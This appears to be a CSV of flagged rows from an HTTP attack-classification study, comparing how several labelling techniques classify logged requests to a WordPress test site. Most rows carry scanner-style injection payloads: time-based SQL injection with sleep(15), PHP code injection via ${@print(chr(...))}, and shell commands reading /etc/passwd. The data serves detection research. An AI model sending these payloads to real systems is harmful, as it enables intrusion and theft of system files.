review_id,row_position,review_priority_score,review_reason,text_input,base_predicted_labels,rules_predicted_labels,embeddings_predicted_labels,llm_few_shot_predicted_labels,llm_zero_shot_predicted_labels
63,1953,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,"request_http_method: GET | request_http_request: /blog/wp-login.php?action=lostpassword | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0"" AND ""1""=""2"" -- | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=system; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595199372%7CN6zlSHC7AOeZ7WSCeWHts6pI6PHkGPqAU9z7L3v9kn3%7Cb2e4133dac569bbcb9b7eebd612e17638e7800de514c2e46f69da14d8722c007; wordpress_test_cookie=WP+Cookie+check",000 - Normal,66 - SQL Injection,88 - OS Command Injection,,
64,1981,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C/index.php/2020/03/23 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/2020/03/23 | request_host: test-site.com,000 - Normal,153 - Input Data Manipulation,194 - Fake the Source of Data,,
65,1987,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/2020/04/04/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=story; wordpress_test_cookie=WP+Cookie+check,000 - Normal,153 - Input Data Manipulation,88 - OS Command Injection,,
66,1990,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C/index.php/2020/04/04/labore-pariatur-amet-quam | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com,000 - Normal,153 - Input Data Manipulation,194 - Fake the Source of Data,,
67,1996,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/2020/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D/04/rerum-soluta-et-quis-excepturi-labore/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=advertising; wordpress_test_cookie=WP+Cookie+check,000 - Normal,153 - Input Data Manipulation,272 - Protocol Manipulation,,
68,1999,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/aliquam-odio-a-labore-magnam-quam-quis/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=memory; wordpress_test_cookie=WP+Cookie+check,000 - Normal,153 - Input Data Manipulation,194 - Fake the Source of Data,,
69,2000,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C/aut-velit-dicta-eaque | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=advice; wordpress_test_cookie=WP+Cookie+check,000 - Normal,153 - Input Data Manipulation,88 - OS Command Injection,,
70,2004,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C/index.php/author/hintz-cedrick/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com,000 - Normal,153 - Input Data Manipulation,88 - OS Command Injection,,
71,2008,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C/vtromp | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=engine; wordpress_test_cookie=WP+Cookie+check,000 - Normal,153 - Input Data Manipulation,310 - Scanning for Vulnerable Software,,
72,2012,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C/index.php/est-reiciendis-laboriosam-aperiam-adipisci-non/embed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/wp-json/oembed/1.0/embed?format=xml&url=http%3A%2F%2Ftest-site.com%2Fblog%2Findex.php%2Fest-reiciendis-laboriosam-aperiam-adipisci-non%2F | request_host: test-site.com,000 - Normal,153 - Input Data Manipulation,272 - Protocol Manipulation,,
73,2013,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D/embed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=memory; wordpress_test_cookie=WP+Cookie+check,000 - Normal,153 - Input Data Manipulation,242 - Code Injection,,
74,2015,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C/index.php/fugiat-recusandae-voluptatem-ratione-quo-placeat | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com,000 - Normal,153 - Input Data Manipulation,194 - Fake the Source of Data,,
75,2036,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C/nulla-quisquam-est-ut-nemo/embed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=appearance; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595207149%7C7vrKhh6jxpp98RJUx8VGGDHWFYfQx5zVgGecAIsQ8NF%7Cbfb64801d857a2742791e66d57f263d6f6d84540757ed11092ac3aa2cda0662f,000 - Normal,153 - Input Data Manipulation,194 - Fake the Source of Data,,
76,2041,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/search/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/?s=bird | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=art; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595207149%7C7vrKhh6jxpp98RJUx8VGGDHWFYfQx5zVgGecAIsQ8NF%7Cbfb64801d857a2742791e66d57f263d6f6d84540757ed11092ac3aa2cda0662f,000 - Normal,153 - Input Data Manipulation,88 - OS Command Injection,,
77,2047,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D/nihil-alias-ab | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=security; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595207149%7C7vrKhh6jxpp98RJUx8VGGDHWFYfQx5zVgGecAIsQ8NF%7Cbfb64801d857a2742791e66d57f263d6f6d84540757ed11092ac3aa2cda0662f,000 - Normal,153 - Input Data Manipulation,242 - Code Injection,,
78,2062,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/wp-content/plugins/user-registration/assets/js/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=bread; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595207149%7C7vrKhh6jxpp98RJUx8VGGDHWFYfQx5zVgGecAIsQ8NF%7Cbfb64801d857a2742791e66d57f263d6f6d84540757ed11092ac3aa2cda0662f; wordpress_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595207149%7C7vrKhh6jxpp98RJUx8VGGDHWFYfQx5zVgGecAIsQ8NF%7Cb7cf0bad63719d6dd963837fd13eac23bf4ed94e7d2282b28abab8adea4d17db,000 - Normal,153 - Input Data Manipulation,88 - OS Command Injection,,
79,2122,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php%26cat+%2Fetc%2Fpasswd%26/2020/04/04/animi-sint-ut-sed-commodi/embed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=recipe; wordpress_test_cookie=WP+Cookie+check,000 - Normal,126 - Path Traversal,34 - HTTP Response Splitting,,
80,2129,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/2020%26cat+%2Fetc%2Fpasswd%26/04/04/explicabo-qui-fuga-distinctio-dolores-voluptatibus-sit/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=oven; wordpress_test_cookie=WP+Cookie+check,000 - Normal,126 - Path Traversal,34 - HTTP Response Splitting,,
81,2164,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog%22%26cat+%2Fetc%2Fpasswd%26%22/index.php/2020/04/04/tempore-odit-cupiditate-voluptas-laudantium-et-facilis | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/2020/04/04/tempore-odit-cupiditate-voluptas-laudantium-et-facilis/ | request_host: test-site.com,000 - Normal,126 - Path Traversal,274 - HTTP Verb Tampering,,
82,2170,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/2020%26cat+%2Fetc%2Fpasswd%26/04/04/vero-nihil-nam-numquam-ullam-quas/feed | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=thanks; wordpress_test_cookie=WP+Cookie+check,000 - Normal,126 - Path Traversal,34 - HTTP Response Splitting,,
83,2183,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/index.php/2020/04%22%26cat+%2Fetc%2Fpasswd%26%22/page/2 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=soup; wordpress_test_cookie=WP+Cookie+check,000 - Normal,126 - Path Traversal,34 - HTTP Response Splitting,,
84,2456,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/wp-content/uploads%26cat+%2Fetc%2Fpasswd%26/2020/04/38536cfd-4e8b-3340-b4c4-af387cc163a8.jpg | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/nihil-dolorem-molestiae-recusandae-corrupti-qui-alias/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=college; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595212059%7CGWgAWVHapC2bzAMywZ77DCFlV58k9y04hBeDt9B2wpg%7C59006f949e57d0c4fd439f571f0a913f28f8cabfb99520b35997b552dc918655,000 - Normal,126 - Path Traversal,310 - Scanning for Vulnerable Software,,
85,2470,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/wp-content/uploads/2020%27%26cat+%2Fetc%2Fpasswd%26%27/04/4b6aa405-8ac7-33d8-9366-43fcef53f97a-300x239.png | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/2020/04/04/voluptas-alias-ut-iure-dicta-aliquid-corrupti/embed/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=thanks; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595212059%7CGWgAWVHapC2bzAMywZ77DCFlV58k9y04hBeDt9B2wpg%7C59006f949e57d0c4fd439f571f0a913f28f8cabfb99520b35997b552dc918655,000 - Normal,126 - Path Traversal,310 - Scanning for Vulnerable Software,,
86,2843,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /5%3BURL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com,000 - Normal,194 - Fake the Source of Data,242 - Code Injection,,
87,3399,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/wp-content/plugins/user-registration%22+%2F+sleep%2815%29+%2F+%22/assets/js/inputmask | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=math; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595243069%7CS1aAsPTqjUoyV2aimmpvYKjF7xFDV3DZPKn4Q7thFzB%7Cd4f9b4f5e6991cdb74513e27895a8683d1dc98424a4daa749abde34702a8a9ea; wordpress_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595243069%7CS1aAsPTqjUoyV2aimmpvYKjF7xFDV3DZPKn4Q7thFzB%7C2b83ec1116892e98e2f7ea65bc73c6001eec46c702ba6f6c60202fe1141835a2,000 - Normal,66 - SQL Injection,34 - HTTP Response Splitting,,
88,3400,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/wp-content/plugins/user-registration/assets%27+%2F+sleep%2815%29+%2F+%27/js/inputmask | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/my-account/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=understanding; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595243069%7CS1aAsPTqjUoyV2aimmpvYKjF7xFDV3DZPKn4Q7thFzB%7Cd4f9b4f5e6991cdb74513e27895a8683d1dc98424a4daa749abde34702a8a9ea; wordpress_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595243069%7CS1aAsPTqjUoyV2aimmpvYKjF7xFDV3DZPKn4Q7thFzB%7C2b83ec1116892e98e2f7ea65bc73c6001eec46c702ba6f6c60202fe1141835a2,000 - Normal,66 - SQL Injection,34 - HTTP Response Splitting,,
89,3402,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/wp-content/plugins/user-registration/assets/js/inputmask/jquery.inputmask.bundle.min.js?ver=4.0.0-beta.58 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0' / sleep(15) / ' | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=variation; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595243069%7CS1aAsPTqjUoyV2aimmpvYKjF7xFDV3DZPKn4Q7thFzB%7Cd4f9b4f5e6991cdb74513e27895a8683d1dc98424a4daa749abde34702a8a9ea; wordpress_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595243069%7CS1aAsPTqjUoyV2aimmpvYKjF7xFDV3DZPKn4Q7thFzB%7C2b83ec1116892e98e2f7ea65bc73c6001eec46c702ba6f6c60202fe1141835a2,000 - Normal,66 - SQL Injection,34 - HTTP Response Splitting,,
90,3403,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/wp-content%22+%2F+sleep%2815%29+%2F+%22/plugins/user-registration/assets/js/jquery-tiptip | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/blog/index.php/my-account/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=history; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595243069%7CS1aAsPTqjUoyV2aimmpvYKjF7xFDV3DZPKn4Q7thFzB%7Cd4f9b4f5e6991cdb74513e27895a8683d1dc98424a4daa749abde34702a8a9ea,000 - Normal,66 - SQL Injection,242 - Code Injection,,
91,3433,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/wp-content/themes/twentyseventeen/assets%22+or+0+in+%28select+sleep%2815%29+%29+--+/js/skip-link-focus-fix.js?ver=1.0 | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_referer: http://test-site.com/ | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=criticism; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595243069%7CS1aAsPTqjUoyV2aimmpvYKjF7xFDV3DZPKn4Q7thFzB%7Cd4f9b4f5e6991cdb74513e27895a8683d1dc98424a4daa749abde34702a8a9ea,000 - Normal,66 - SQL Injection,242 - Code Injection,,
92,3495,0.763262,desacuerdo_alto_entre_tecnicas;conflicto_normal_vs_ataque;baja_confianza_o_incertidumbre,request_http_method: GET | request_http_request: /blog/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4+%2F+sleep%2815%29+ | request_user_agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 | request_host: test-site.com | request_cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=moment; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_1aefbe2f76edd740f8e362f39da3353b=rafael%7C1595243069%7CS1aAsPTqjUoyV2aimmpvYKjF7xFDV3DZPKn4Q7thFzB%7Cd4f9b4f5e6991cdb74513e27895a8683d1dc98424a4daa749abde34702a8a9ea,000 - Normal,66 - SQL Injection,242 - Code Injection,,
